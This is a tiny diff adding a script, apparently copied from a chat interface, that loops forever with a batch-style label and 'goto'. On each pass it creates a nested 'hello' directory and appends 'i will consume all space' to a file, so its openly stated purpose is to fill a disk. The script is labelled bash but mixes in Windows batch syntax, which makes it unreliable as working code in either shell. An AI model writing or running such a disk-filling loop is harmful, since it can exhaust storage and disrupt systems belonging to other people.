@@ -1,0 +1,7 @@
+bashCopy code
+:amit
+ mkdir hello
+ cd hello
+ echo "i will consume all space">>file.txt
+ goto amit
+
